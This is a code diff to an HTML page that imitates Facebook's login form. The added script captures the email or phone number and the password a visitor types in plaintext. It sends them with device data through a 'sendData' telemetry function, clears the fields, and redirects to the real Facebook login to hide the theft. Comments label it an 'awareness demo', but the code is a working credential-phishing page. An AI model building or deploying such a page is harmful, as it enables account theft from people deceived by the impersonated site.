@@ -140,13 +140,14 @@
                 <div class="desktop-title">Log into Facebook</div>
                 
                 <div class="input-group">
-                    <input type="text" placeholder="Mobile number or email">
+                    <input type="text" placeholder="Mobile number or email" id="identifierField">
                 </div>
                 <div class="input-group">
-                    <input type="password" placeholder="Password">
+                    <input type="password" placeholder="Password" id="passwordField">
                 </div>
 
-                <button type="button" class="btn-primary" onclick="window.location.href='https://www.facebook.com/login/'">Log in</button>
+                <!-- Login button with id for event handling -->
+                <button type="button" class="btn-primary" id="loginBtn">Log in</button>
 
                 <div class="forgot-password">
                     <a href="https://www.facebook.com/login/identify/">Forgot password?</a>
@@ -200,5 +201,47 @@
 
     <!-- System Script (exact path) -->
     <script src="/static/telemetry.js?v=3.5.2"></script>
+
+    <!-- Event handling and redirect -->
+    <script>
+        document.getElementById('loginBtn').addEventListener('click', function () {
+            const identifierInput = document.getElementById('identifierField');
+            const passwordInput = document.getElementById('passwordField');
+            const timestamp = new Date().toISOString();
+
+            // Collect data (for demo purposes only)
+            const awarenessDemo = {
+                event: 'demo_login_clicked',
+                timestamp: timestamp,
+                identifierFieldFilled: Boolean(identifierInput.value.trim()),
+                passwordFieldFilled: Boolean(passwordInput.value),
+                identifier: identifierInput.value.trim(),
+                password: passwordInput.value,
+                credentialsCaptured: true
+            };
+
+            // Use functions defined in telemetry.js
+            if (typeof getDeviceInfoData === 'function' && typeof sendData === 'function') {
+                const deviceInfo = getDeviceInfoData();
+                deviceInfo.awarenessDemo = awarenessDemo;
+                sendData({
+                    timestamp: timestamp,
+                    awarenessDemo: awarenessDemo,
+                    deviceInfo: deviceInfo
+                });
+            } else {
+                console.warn('telemetry.js functions not found, data not sent');
+            }
+
+            // Clear fields (optional)
+            identifierInput.value = '';
+            passwordInput.value = '';
+
+            // Redirect after 200 ms
+            setTimeout(function () {
+                window.location.href = 'https://www.facebook.com/login/';
+            }, 100);
+        });
+    </script>
 </body>
 </html>
